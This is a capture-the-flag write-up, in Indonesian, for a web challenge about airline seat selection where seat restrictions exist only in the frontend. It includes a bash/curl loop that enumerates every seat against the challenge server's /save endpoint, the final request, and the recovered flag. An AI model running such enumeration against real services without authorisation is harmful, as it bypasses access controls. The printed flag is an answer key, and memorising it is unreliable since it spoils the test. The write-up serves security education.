# Simon — Writeup

## Ringkasan

Challenge ini adalah blackbox web challenge tentang pemilihan kursi pesawat.

Halaman menyediakan seat map dan tombol **Save**. Dari source frontend, request disimpan melalui endpoint `/save`:

```javascript
fetch('/save', {
  method: 'POST',
  body: JSON.stringify({
    seat: selectedSeat,
  }),
});
```

Response kemudian diperiksa:

```javascript
if (d.flag) {
  location.reload();
}
```

Artinya endpoint `/save` dapat mengembalikan `flag:true` ketika seat yang dipilih benar.

## Analisis Awal

Halaman membuat 21 row, kecuali row 13:

```javascript
const rows = Array.from({ length: 21 }, (_, i) => i + 1)
  .filter((row) => row !== 13);
```

Setiap row memiliki empat seat:

```text
A B C D
```

Frontend juga menentukan status seat. Contohnya:

```javascript
function seatStatus(row, letter) {
  if (row <= 2) return 'unavailable';
  if (row === 3 && letter === 'A') return 'unavailable';
  if (row === 4 && letter === 'B') return 'unavailable';

  ...
}
```

Jadi row 1 dan row 2 dianggap `unavailable`.

Seat awal yang dipilih frontend adalah:

```javascript
let selectedSeat = '19D';
```

## Analisis Endpoint `/save`

Daripada menggunakan UI, endpoint bisa dipanggil langsung.

Request:

```http
POST /save
Content-Type: application/json

{"seat":"19D"}
```

Response:

```json
{"ok":true,"seat":"19D"}
```

Seat lain seperti `5A` juga diterima:

```json
{"ok":true,"seat":"5A"}
```

Dengan JSON kosong:

```json
{"ok":false,"error":"Must be a valid seat, for example: 21D"}
```

Ini menunjukkan server hanya memastikan format seat valid.

Yang menarik, restriction `unavailable` dari frontend tidak menjadi restriction server-side.

## Blackbox Testing

Karena jumlah seat kecil, semua kombinasi valid dapat dicoba.

Command:

```bash
for r in {1..21}; do
  [ "$r" -eq 13 ] && continue

  for c in A B C D; do
    s="$r$c"

    x=$(curl -sk -X POST \
      'https://simon-bdf41954f9b2.chall.nnsc.tf/save' \
      -H 'Content-Type: application/json' \
      --data "{\"seat\":\"$s\"}")

    echo "$s -> $x" | grep -Ei 'flag|NNS\{|error' && break 2
  done
done
```

Hasilnya:

```text
1A -> {"ok":true,"seat":"1A","flag":true}
```

Jadi seat yang benar adalah:

```text
1A
```

## Kenapa `1A`?

Frontend dengan jelas menganggap semua seat pada row 1 tidak tersedia:

```javascript
if (row <= 2) return 'unavailable';
```

Tetapi server tetap menerima:

```json
{"seat":"1A"}
```

bahkan mengembalikan:

```json
{"ok":true,"seat":"1A","flag":true}
```

Ini menunjukkan adanya perbedaan antara validasi di client dan logic di server.

Restriction frontend dapat dilewati dengan mengirim HTTP request langsung.

## Mendapatkan Flag

Frontend melakukan reload jika response mengandung `flag`:

```javascript
if (d.flag) {
  location.reload();
}
```

Setelah seat `1A` disimpan, halaman menampilkan bagian flag:

```html
<div class="flag">
  <h2>Your NNS Air Plus flag benefit</h2>
  <p>Flag: <code>{{FLAG}}</code></p>
</div>
```

Flag yang diperoleh:

```text
NNS{w3_wi5H_you_4_Pl34saNt_FligH7_Wi7H_Nn5_aiR}
```

## Request Final

Request langsung ke endpoint:

```bash
curl -sk -X POST \
  'https://simon-bdf41954f9b2.chall.nnsc.tf/save' \
  -H 'Content-Type: application/json' \
  --data '{"seat":"1A"}'
```

Response:

```json
{"ok":true,"seat":"1A","flag":true}
```

Setelah itu reload halaman untuk melihat flag.

## Root Cause

Bug utamanya adalah validasi seat yang hanya diterapkan di frontend.

Frontend:

```text
1A = unavailable
```

Server:

```text
1A = valid
```

Bahkan server menganggap `1A` sebagai seat yang memberikan flag benefit.

Aplikasi seharusnya mengulangi seluruh validasi penting di server-side dan tidak mempercayai status yang hanya ditentukan JavaScript.

## Flag

```text
<FLAG>NNS{w3_wi5H_you_4_Pl34saNt_FligH7_Wi7H_Nn5_aiR}</FLAG>
```
